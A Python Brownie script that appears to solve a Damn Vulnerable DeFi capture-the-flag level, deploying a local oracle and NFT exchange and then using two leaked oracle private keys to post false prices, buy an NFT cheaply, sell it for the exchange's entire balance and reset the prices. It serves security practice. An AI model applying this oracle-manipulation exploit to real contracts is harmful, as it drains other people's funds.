from brownie import DamnValuableNFT, Exchange, TrustfulOracle, TrustfulOracleInitializer, accounts, chain, Wei, web3

sources = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
]

EXCHANGE_INITIAL_ETH_BALANCE = Wei('9990 ether')
INITIAL_NFT_PRICE = Wei('999 ether')


def deploy():
    deployer, attacker = accounts[:2]

    for i in sources:
        deployer.transfer(i, "2 ether")
        assert web3.eth.getBalance(i) == Wei('2 ether')

    attacker.transfer(deployer, attacker.balance()-"0.1 ether")
    assert attacker.balance() == "0.1 ether"

    oracle = TrustfulOracle.at(
        TrustfulOracleInitializer.deploy(
            sources,
            ['DVNFT', 'DVNFT', 'DVNFT'],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
            {'from': deployer}
        ).oracle()
    )

    exchange = Exchange.deploy(
        oracle, {'from': deployer, 'value': EXCHANGE_INITIAL_ETH_BALANCE})

    nftToken = DamnValuableNFT.at(exchange.token())

    return deployer, attacker, nftToken, exchange, oracle


def exploit(attacker, nftToken, exchange, oracle):

    private_keys = ['0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
                    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48']
    compromised_users = [accounts.add(i) for i in private_keys]

    buying_prices = ['0 ether', '0.1 ether']
    selling_prices = [exchange.balance() + '0.1 ether', '100000 ether']
    reset_prices = [INITIAL_NFT_PRICE]*2

    for i, j in enumerate(compromised_users):
        oracle.postPrice('DVNFT', buying_prices[i], {'from': j})

    tokenId = exchange.buyOne(
        {'from': attacker, 'value': '0.1 ether'}).return_value

    for i, j in enumerate(compromised_users):
        oracle.postPrice('DVNFT', selling_prices[i], {'from': j})

    nftToken.approve(exchange, tokenId, {'from': attacker})
    exchange.sellOne(tokenId, {'from': attacker})

    for i, j in enumerate(compromised_users):
        oracle.postPrice('DVNFT', reset_prices[i], {'from': j})


def after(attacker, nftToken, exchange, oracle):

    assert exchange.balance() == 0
    assert attacker.balance() > EXCHANGE_INITIAL_ETH_BALANCE
    assert nftToken.balanceOf(attacker) == 0
    assert oracle.getMedianPrice('DVNFT') == INITIAL_NFT_PRICE


def main():
    deployer, attacker, nftToken, exchange, oracle = deploy()

    exploit(attacker, nftToken,  exchange, oracle)

    after(attacker, nftToken, exchange, oracle)
